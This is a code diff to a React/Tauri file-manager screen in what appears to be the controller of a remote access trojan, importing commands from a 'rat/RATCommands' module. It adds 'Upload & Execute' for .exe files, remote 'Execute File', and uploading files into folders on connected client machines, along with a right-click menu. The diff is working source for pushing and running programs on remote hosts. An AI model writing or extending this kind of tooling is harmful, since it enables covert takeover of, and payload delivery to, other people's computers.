@@ -1,8 +1,9 @@
 import { useEffect, useState, useRef } from "react";
 import { useParams } from "react-router-dom";
 import { FileType } from "../../types";
-import { readFilesCmd, manageFileCmd } from "../rat/RATCommands";
+import { readFilesCmd, manageFileCmd, uploadAndExecute, executeFile } from "../rat/RATCommands";
 import { listen } from "@tauri-apps/api/event";
+import { open } from "@tauri-apps/api/dialog";
 import {
   IconFolderFilled,
   IconFileFilled,
@@ -22,7 +23,12 @@ import {
   IconFolders,
   IconSearch,
   IconFileDescription,
+  IconUpload,
+  IconPlayerPlay,
+  IconDotsVertical,
+  IconFileUpload,
 } from "@tabler/icons-react";
+import { invoke } from "@tauri-apps/api/tauri";
 
 let fileIcon = {
   dir: <IconFolderFilled size={24} className="text-accentx" />,
@@ -37,16 +43,23 @@ export const FileManager = () => {
   const [folderFilter, setFolderFilter] = useState("");
   const [fileFilter, setFileFilter] = useState("");
   const [loading, setLoading] = useState(false);
+  const [contextMenu, setContextMenu] = useState<{
+    visible: boolean;
+    x: number;
+    y: number;
+    fileName: string;
+  }>({ visible: false, x: 0, y: 0, fileName: "" });
 
   const filesRef = useRef<HTMLDivElement>(null);
   const foldersRef = useRef<HTMLDivElement>(null);
+  const contextMenuRef = useRef<HTMLDivElement>(null);
 
   function fileActions(type: string, fileName: string) {
     if (type === "file")
       return (
-        <div className="flex flex-row gap-2 justify-center w-full">
+        <div className="flex flex-row gap-1 justify-center w-full">
           <button
-            className="cursor-pointer px-3 py-1.5 bg-secondarybg text-gray-200 hover:bg-accentx hover:text-white border border-gray-700 rounded flex items-center gap-1.5 text-xs font-medium transition-colors"
+            className="cursor-pointer px-2 py-1 bg-secondarybg text-gray-200 hover:bg-accentx hover:text-white border border-gray-700 rounded flex items-center gap-1 text-xs font-medium transition-colors"
             onClick={(e) => {
               e.stopPropagation();
               manageFile("download_file", fileName);
@@ -54,16 +67,19 @@ export const FileManager = () => {
             title="Download File"
           >
             <IconDownload size={14} />
-            Download
+            <span className="hidden sm:inline">Download</span>
           </button>
 
           <button
-            className="cursor-pointer px-3 py-1.5 bg-red-900 text-white hover:bg-red-700 rounded flex items-center gap-1.5 text-xs font-medium transition-colors"
-            onClick={() => manageFile("remove_file", fileName)}
+            className="cursor-pointer px-2 py-1 bg-red-900 text-white hover:bg-red-700 rounded flex items-center gap-1 text-xs font-medium transition-colors"
+            onClick={(e) => {
+              e.stopPropagation();
+              manageFile("remove_file", fileName);
+            }}
             title="Delete File"
           >
             <IconTrash size={14} />
-            Delete
+            <span className="hidden sm:inline">Delete</span>
           </button>
         </div>
       );
@@ -72,6 +88,21 @@ export const FileManager = () => {
 
   useEffect(() => {
     fetchFolder("disks");
+
+    // Handle clicks outside the context menu
+    const handleClickOutside = (event: MouseEvent) => {
+      if (
+        contextMenuRef.current &&
+        !contextMenuRef.current.contains(event.target as Node)
+      ) {
+        setContextMenu(prev => ({ ...prev, visible: false }));
+      }
+    };
+
+    document.addEventListener("mousedown", handleClickOutside);
+    return () => {
+      document.removeEventListener("mousedown", handleClickOutside);
+    };
   }, []);
 
   useEffect(() => {
@@ -118,6 +149,76 @@ export const FileManager = () => {
   async function manageFile(command: string, fileName: string) {
     await manageFileCmd(addr, command, fileName);
   }
+
+  async function executeRemoteFile(fileName: string) {
+    if (path) {
+      const fullPath = `${path}\\${fileName}`;
+      await executeFile(addr, fullPath);
+    }
+  }
+
+  async function uploadAndExecuteFile() {
+    const selected = await open({
+      multiple: false,
+      filters: [{ name: "Executable", extensions: ["exe"] }],
+    });
+
+    if (selected && !Array.isArray(selected)) {
+      await uploadAndExecute(addr, selected);
+    }
+  }
+
+  async function uploadFileToCurrentFolder() {
+    if (!path) {
+      alert("Please navigate to a folder first");
+      return;
+    }
+
+    const selected = await open({
+      multiple: false,
+      title: "Select a file to upload",
+    });
+
+    if (selected && !Array.isArray(selected)) {
+      try {
+        // Read the file content
+        const fileData = await invoke("read_file_for_upload", { filePath: selected });
+        
+        // Get just the filename from the path
+        const fileName = selected.split(/[\\\/]/).pop();
+        
+        // Send the file to the client
+        await invoke("upload_file_to_folder", { 
+          addr, 
+          targetFolder: path,
+          fileName,
+          fileData 
+        });
+        
+        // Refresh the directory after upload
+        await readFilesCmd(addr, "view_dir", path.split("\\").pop() || "");
+      } catch (error) {
+        console.error("Failed to upload file:", error);
+        alert("Failed to upload file: " + error);
+      }
+    }
+  }
+
+  const handleContextMenu = (e: React.MouseEvent, fileName: string) => {
+    e.preventDefault();
+    
+    // Get the position for the context menu
+    const x = e.clientX;
+    const y = e.clientY;
+    
+    // Set the context menu information
+    setContextMenu({
+      visible: true,
+      x,
+      y,
+      fileName
+    });
+  };
 
   function fileExtension(fileName: string) {
     if (
@@ -182,6 +283,45 @@ export const FileManager = () => {
 
   return (
     <div className="p-6 w-full h-screen bg-primarybg flex flex-col overflow-hidden">
+      {/* Context Menu */}
+      {contextMenu.visible && (
+        <div
+          ref={contextMenuRef}
+          className="fixed z-50 bg-secondarybg border border-gray-700 rounded-md shadow-xl"
+          style={{ top: contextMenu.y, left: contextMenu.x }}
+        >
+          <ul className="py-1">
+            <li 
+              className="px-4 py-2 hover:bg-accentx hover:text-white flex items-center gap-2 cursor-pointer text-sm"
+              onClick={() => {
+                executeRemoteFile(contextMenu.fileName);
+                setContextMenu(prev => ({ ...prev, visible: false }));
+              }}
+            >
+              <IconPlayerPlay size={16} /> Execute File
+            </li>
+            <li 
+              className="px-4 py-2 hover:bg-accentx hover:text-white flex items-center gap-2 cursor-pointer text-sm"
+              onClick={() => {
+                manageFile("download_file", contextMenu.fileName);
+                setContextMenu(prev => ({ ...prev, visible: false }));
+              }}
+            >
+              <IconDownload size={16} /> Download File
+            </li>
+            <li 
+              className="px-4 py-2 hover:bg-red-900 hover:text-white flex items-center gap-2 cursor-pointer text-sm"
+              onClick={() => {
+                manageFile("remove_file", contextMenu.fileName);
+                setContextMenu(prev => ({ ...prev, visible: false }));
+              }}
+            >
+              <IconTrash size={16} /> Delete File
+            </li>
+          </ul>
+        </div>
+      )}
+
       {/* Header */}
       <div className="flex justify-between items-center mb-6">
         <div className="flex items-center gap-2">
@@ -189,9 +329,29 @@ export const FileManager = () => {
           <h2 className="text-xl font-medium text-white">File Manager</h2>
         </div>
 
-        <div className="text-sm text-gray-400 max-w-lg truncate">
-          <span className="text-white mr-1">Current path:</span>{" "}
-          {path || "Loading..."}
+        <div className="flex items-center gap-3">
+          <button
+            className="cursor-pointer px-3 py-1.5 bg-accentx text-white hover:bg-opacity-80 rounded flex items-center gap-1.5 text-xs font-medium transition-colors"
+            onClick={uploadAndExecuteFile}
+            title="Upload & Execute File"
+          >
+            <IconUpload size={14} />
+            Upload & Execute
+          </button>
+          
+          <button
+            className="cursor-pointer px-3 py-1.5 bg-blue-600 text-white hover:bg-blue-700 rounded flex items-center gap-1.5 text-xs font-medium transition-colors"
+            onClick={uploadFileToCurrentFolder}
+            title="Upload File to Current Folder"
+          >
+            <IconFileUpload size={14} />
+            Upload File
+          </button>
+          
+          <div className="text-sm text-gray-400 max-w-lg truncate">
+            <span className="text-white mr-1">Current path:</span>{" "}
+            {path || "Loading..."}
+          </div>
         </div>
       </div>
 
@@ -323,15 +483,38 @@ export const FileManager = () => {
                 {filteredFiles.map((file) => (
                   <div
                     key={file.name}
-                    className="flex flex-col justify-between p-4 bg-primarybg rounded-lg hover:bg-gray-800 transition group"
+                    className="flex flex-col justify-between p-4 bg-primarybg rounded-lg hover:bg-gray-800 transition group relative"
+                    onContextMenu={(e) => handleContextMenu(e, file.name)}
                   >
+                    <div className="absolute top-2 right-2">
+                      <button
+                        className="w-8 h-8 rounded-full opacity-0 group-hover:opacity-100 bg-gray-700 hover:bg-accentx flex items-center justify-center transition-all text-white"
+                        onClick={(e) => {
+                          e.stopPropagation();
+                          const rect = e.currentTarget.getBoundingClientRect();
+                          setContextMenu({
+                            visible: true,
+                            x: rect.right,
+                            y: rect.bottom,
+                            fileName: file.name
+                          });
+                        }}
+                      >
+                        <IconDotsVertical size={16} />
+                      </button>
+                    </div>
                     <div className="mb-3 flex justify-center">
                       {fileExtension(file.name)}
                     </div>
                     <div className="mb-4 w-full text-center" title={file.name}>
                       <span className="block truncate px-2">{file.name}</span>
                     </div>
-                    {fileActions(file.file_type, file.name)}
+                    <div className="flex flex-col">
+                      <div className="text-center mb-2 text-xs text-gray-400">
+                        <em>Right-click for more options</em>
+                      </div>
+                      {fileActions(file.file_type, file.name)}
+                    </div>
                   </div>
                 ))}
               </div>
